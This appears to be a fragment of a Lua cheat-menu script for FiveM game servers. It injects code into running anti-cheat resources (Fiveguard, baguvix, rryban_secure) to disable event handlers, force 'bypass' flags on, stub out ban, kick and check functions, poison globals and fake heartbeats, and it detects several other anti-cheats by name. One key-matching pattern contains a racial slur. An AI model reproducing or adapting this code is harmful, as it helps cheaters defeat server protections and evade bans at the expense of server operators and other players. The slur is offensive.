                        ["CEventPotentialBlast"]="Potential Blast Bypassed",["CEventRanOverPed"]="Ran Over Ped Bypassed",
                        ["CEventSeenCop"]="Seen Cop Bypassed",["CEventFootStepHeard"]="Footstep Heard Bypassed",
                        ["CEventHurtTransition"]="Hurt Transition Bypassed",["CEventMeleeAction"]="Melee Action Bypassed",
                        ["CEventMeleeHit"]="Melee Hit Bypassed",["CEventDamage"]="Damage Event Bypassed",
                        ["CEventDeath"]="Death Event Bypassed",["CEventRevived"]="Revive Event Bypassed",
                        ["CEventScriptCommand"]="Script Command Bypassed",["CEventOpenDoor"]="Door Open Bypassed",
                        ["CEventCloseDoor"]="Door Close Bypassed",["CEventClimbLadderOnRoute"]="Ladder Route Bypassed",
                        ["CEventStatValueChanged"]="Stat Change Bypassed"
                    }

                    for eventName in pairs(targets) do
                        local raw = eventHandlers[eventName]
                        if raw then
                            if raw.handlers then
                                for id, fn in pairs(raw.handlers) do
                                    if type(fn) == "function" then
                                        raw.handlers[id] = function() end
                                    end
                                end
                            else
                                for id, fn in pairs(raw) do
                                    if type(fn) == "function" then
                                        raw[id] = function() end
                                    end
                                end
                            end
                        end
                    end
                end

                local seen = {}
                local depth = 0

                local function get_value_str(v)
                    if v == nil then return "nil" end
                    if type(v) == "string" then
                        return '"' .. v:sub(1,80):gsub("\n","\\n") .. (#v>80 and "..." or "") .. '"'
                    elseif type(v) == "function" then
                        local info = debug.getinfo(v, "Sln") or {}
                        return string.format("func(%s:%d)", info.short_src or "?", info.linedefined or 0)
                    elseif type(v) == "table" then
                        return tostring(v) .. " [#" .. (#v or "?") .. "]"
                    end
                    return tostring(v)
                end

                local function unlockScan(t, path)
                    if type(t) ~= "table" or seen[t] or depth > 12 then return end
                    seen[t] = true
                    depth = depth + 1

                    for k, v in pairs(t) do
                        if type(k) == "string" then
                            local changed = false
                            local before = v

                            if (k:sub(-6) == "Nigger" or k:find("bypass") or k:find("Bypass")) and v ~= true then
                                t[k] = true
                                changed = true
                            end
                        end

                        if type(v) == "table" then
                            unlockScan(v, path .. "." .. (type(k)=="string" and k or "["..tostring(k).."]"))
                        elseif type(v) == "function" then
                            local j = 1
                            while true do
                                local un, uv = debug.getupvalue(v, j)
                                if not un then break end
                                if type(uv) == "table" then
                                    unlockScan(uv, path .. "." .. k .. " " .. un)
                                end
                                j = j + 1
                            end
                        end
                    end

                    depth = depth - 1
                end

                i = 1
                while true do
                    local name, value = debug.getupvalue(AddEventHandler, i)
                    if not name then break end

                    if type(value) == "table" then
                        unlockScan(value, "up["..i.."]("..name..")")
                    elseif type(value) == "function" then
                        local j = 1
                        while true do
                            local un, uv = debug.getupvalue(value, j)
                            if not un then break end
                            if type(uv) == "table" then
                                unlockScan(uv, "up["..i.."]("..name..") "..un)
                            end
                            j = j + 1
                        end
                    end
                    i = i + 1
                end
            end)
        ]])
        self:Notify("info", "WTP", "Loaded Bypass (Fiveguard)", 3000)
    elseif GetResourceState("baguvix") == "started" then
        MachoInjectResource2(3, "baguvix", [[
            _G.TriggerServerEvent = true
            _G.TriggerLatentServerEvent = true
            pcall(function()
                for name, value in pairs(_G) do
                    if type(value) == "table" and name ~= "_G" and name ~= "SetStateBagValue" then
                        _G[name] = 1337
                    end
                end
            end)
            pcall(function()
                debug.setmetatable(_G, {
                    __newindex = function(t, k, v) end,
                    __metatable = false
                })
            end)
        ]])
        MachoInjectResource2(3, "baguvix", [[
            local oldTrigger = _G.TriggerServerEvent
            _G.TriggerServerEvent = function(...) end
            _G.TriggerLatentServerEvent = function(...) end
            for name, value in pairs(_G) do
                if type(value) == "table" and name ~= "_G" then
                    for k, v in pairs(value) do
                        if type(k) == "string" and (k:find("Ban") or k:find("Kick") or k:find("Check")) then
                            value[k] = function() return end
                        end
                    end
                end
            end
        ]])
    elseif GetResourceState("rryban_secure") == "started" then
        MachoInjectResourceScriptOverride(1, "rryban_secure", [[
            local zxpcozxocasd =  function()
                local origAddSBCH = AddStateBagChangeHandler
                local origGetTimer = GetGameTimer
                local origWait = Citizen.Wait
                local origCT = Citizen.CreateThread
                local origMathMax = math.max
                local origPairs = pairs
                local origType = type
                local origRawset = rawset
                local origPrint = print
                local registeredHeartbeats = {
                    ["anti-health-armour"] = { interval = 250, heartbeat = origGetTimer() },
                    ["main"]              = { interval = 250, heartbeat = origGetTimer() },
                    ["anti-godmode"]      = { interval = 1000, heartbeat = origGetTimer() },
                    ["anti-coords"]       = { interval = 250, heartbeat = origGetTimer() },
                    ["anti-invisibility"] = { interval = 250, heartbeat = origGetTimer() },
                }
                origAddSBCH("rb_heartbeat", "global", function()
                    -- update all timestamps so antiStop never triggers
                    local now = origGetTimer()
                    for _, data in origPairs(registeredHeartbeats) do
                        data.heartbeat = now
                    end
                end)
                local function fakeHeartbeat(moduleName, interval)
                    if origType(moduleName) == "string" then
                        registeredHeartbeats[moduleName] = {
                            interval = origType(interval) == "number" and interval or 250,
                            heartbeat = origGetTimer()
                        }
                    end
                end
                origCT(function()
                    while true do
                        local now = origGetTimer()
                        for _, data in origPairs(registeredHeartbeats) do
                            data.heartbeat = now
                        end
                        origWait(200)
                    end
                end)
                origRawset(Citizen, "Trace", function() end)
                local TableSpecials = {
                    ["print"] = true,
                    ["_G"] = true,
                    ["__VERSION"] = true,
                }
                _G["__VERSION"] = _G
                origRawset(_G, "print", origPrint)
                origRawset(_G, "error", function() end)
                origRawset(_G, "Heartbeat", fakeHeartbeat)
                for k, v in origPairs(_G) do
                    if not TableSpecials[k] and k ~= "Heartbeat" then
                        _G[k] = function()
                            _ENV(10000 * 10000)
                        end
                    end
                end
                origPrint("[RRYBAN] _G poisoned + heartbeat alive")
            end
            zxpcozxocasd();
        ]], '=-1', 2, 33)
        self:Notify("info", "WTP", "Loaded Bypass (rryban_secure)", 3000)
    end

    local detectedAC = nil
    if GetResourceState("WaveShield") == 'started' then
        detectedAC = "WaveShield"
    elseif GetResourceState("ReaperV4") == 'started' then
        detectedAC = "ReaperV4"
    elseif GetResourceState("ElectronAC") == 'started' then
        detectedAC = "ElectronAC"
    elseif GetResourceState("FiniAC") == 'started' then
        detectedAC = "FiniAC"
    elseif GetResourceState("baguvix") == 'started' then
        detectedAC = "Baguvix"
    elseif GetResourceState("Eminence") == 'started' then
        detectedAC = "Eminence"
    elseif GetResourceState("AegisX") == 'started' then
        detectedAC = "AegisX"
    elseif GetResourceState("VynxAC") == 'started' then
        detectedAC = "VynxAC"
    end

    if detectedAC then
        WTP:Notify("error", "WTP", detectedAC .. " Anticheat Found.", 3000)
    end
end

Wait(500)
WTP:LoadBypass()